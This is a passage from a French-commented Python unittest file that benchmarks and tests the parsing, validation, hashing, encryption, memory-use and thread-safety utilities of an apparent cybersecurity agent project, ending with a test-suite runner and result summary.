                {"port": 443, "service": "https"}
            ] * 100
        }

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(large_json_data, f)
            json_file = f.name

        try:
            # Benchmark parsing JSON
            start_time = time.perf_counter()
            for _ in range(10):
                parse_json_report(json_file)
            json_parsing_time = time.perf_counter() - start_time

            # Benchmark parsing vulnérabilités
            start_time = time.perf_counter()
            for vuln in self.large_dataset:
                parse_vulnerability_data(vuln)
            vuln_parsing_time = time.perf_counter() - start_time

            print(f"\nBenchmarks Parsing:")
            print(f"JSON parsing (10 iterations): {json_parsing_time:.4f}s")
            print(f"Vulnerability parsing (1000 items): {vuln_parsing_time:.4f}s")

            return {
                "json_parsing": json_parsing_time,
                "vuln_parsing": vuln_parsing_time
            }

        finally:
            os.unlink(json_file)

    def benchmark_security(self):
        """Benchmark des utilitaires de sécurité"""
        import time

        test_data = "sensitive_data_to_encrypt_" * 100
        password = "secure_password_123"

        # Benchmark hashage
        start_time = time.perf_counter()
        for _ in range(1000):
            hash_data("test_data_" + str(_))
        hashing_time = time.perf_counter() - start_time

        # Benchmark chiffrement
        start_time = time.perf_counter()
        for _ in range(100):
            encrypted = encrypt_sensitive_data(test_data, password)
            decrypt_sensitive_data(encrypted, password)
        encryption_time = time.perf_counter() - start_time

        print(f"\nBenchmarks Security:")
        print(f"Hashing (1000 items): {hashing_time:.4f}s")
        print(f"Encryption/Decryption (100 cycles): {encryption_time:.4f}s")

        return {
            "hashing": hashing_time,
            "encryption": encryption_time
        }

    def test_run_all_benchmarks(self):
        """Lance tous les benchmarks"""
        print("\n" + "="*50)
        print("BENCHMARKS UTILITAIRES")
        print("="*50)

        validator_results = self.benchmark_validators()
        parser_results = self.benchmark_parsers()
        security_results = self.benchmark_security()

        # Vérifier que les performances sont acceptables
        self.assertLess(validator_results["ip_validation"], 1.0)
        self.assertLess(parser_results["json_parsing"], 2.0)
        self.assertLess(security_results["hashing"], 0.5)


# === TESTS SPÉCIAUX ===

class TestUtilsSpecial(unittest.TestCase):
    """Tests spéciaux et cas d'usage avancés"""

    def test_memory_usage(self):
        """Test de l'utilisation mémoire"""
        import tracemalloc
        import gc

        tracemalloc.start()

        # Test avec gros dataset
        large_data = TestUtilsHelpers.create_large_dataset(5000)

        # Opérations intensives
        for item in large_data:
            hash_data(json.dumps(item))
            sanitize_input(item["name"])

        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()

        # La mémoire utilisée ne devrait pas être excessive
        self.assertLess(peak / 1024 / 1024, 100)  # < 100MB

        # Forcer garbage collection
        gc.collect()

    def test_thread_safety(self):
        """Test de sécurité des threads"""
        import threading
        import queue

        results = queue.Queue()

        def worker(worker_id):
            """Worker thread pour tests concurrents"""
            try:
                # Test validation concurrente
                for i in range(100):
                    ip = f"192.168.1.{i % 254 + 1}"
                    result = validate_ip_address(ip)
                    if not result:
                        results.put(f"Worker {worker_id}: IP validation failed")
                        return

                # Test hashage concurrent
                for i in range(100):
                    data = f"worker_{worker_id}_data_{i}"
                    hash_result = hash_data(data)
                    if len(hash_result) != 64:
                        results.put(f"Worker {worker_id}: Hash failed")
                        return

                results.put(f"Worker {worker_id}: Success")

            except Exception as e:
                results.put(f"Worker {worker_id}: Exception {e}")

        # Lancer plusieurs threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=worker, args=(i,))
            threads.append(thread)
            thread.start()

        # Attendre tous les threads
        for thread in threads:
            thread.join()

        # Vérifier les résultats
        success_count = 0
        while not results.empty():
            result = results.get()
            if "Success" in result:
                success_count += 1
            else:
                self.fail(f"Thread safety issue: {result}")

        self.assertEqual(success_count, 10)


if __name__ == '__main__':
    # Configuration des tests
    unittest.TestLoader.testMethodPrefix = 'test'

    # Créer la suite de tests
    test_suite = unittest.TestSuite()

    # Tests principaux
    test_suite.addTest(unittest.makeSuite(TestLogger))
    test_suite.addTest(unittest.makeSuite(TestValidators))
    test_suite.addTest(unittest.makeSuite(TestParsers))
    test_suite.addTest(unittest.makeSuite(TestSecurity))
    test_suite.addTest(unittest.makeSuite(TestIntegration))

    # Tests avancés
    test_suite.addTest(unittest.makeSuite(TestUtilsEdgeCases))
    test_suite.addTest(unittest.makeSuite(TestUtilsAsync))
    test_suite.addTest(unittest.makeSuite(TestUtilsMocking))

    # Tests de performance (optionnels)
    import sys
    if '--benchmark' in sys.argv:
        test_suite.addTest(unittest.makeSuite(TestUtilsBenchmarks))
        test_suite.addTest(unittest.makeSuite(TestUtilsSpecial))

    # Lancer les tests
    runner = unittest.TextTestRunner(
        verbosity=2,
        stream=sys.stdout,
        descriptions=True
    )

    print("Lancement des tests utilitaires pour l'Agent IA de Cybersécurité")
    print("=" * 70)

    result = runner.run(test_suite)

    # Résumé final
    print("\n" + "=" * 70)
    print(f"Tests exécutés: {result.testsRun}")
    print(f"Échecs: {len(result.failures)}")
    print(f"Erreurs: {len(result.errors)}")
    print(f"Succès: {result.testsRun - len(result.failures) - len(result.errors)}")

    if result.failures:
        print("\nÉchecs:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError:')[-1].strip()}")

    if result.errors:
        print("\nErreurs:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('Exception:')[-1].strip()}")

    # Code de sortie
    sys.exit(0 if result.wasSuccessful() else 1)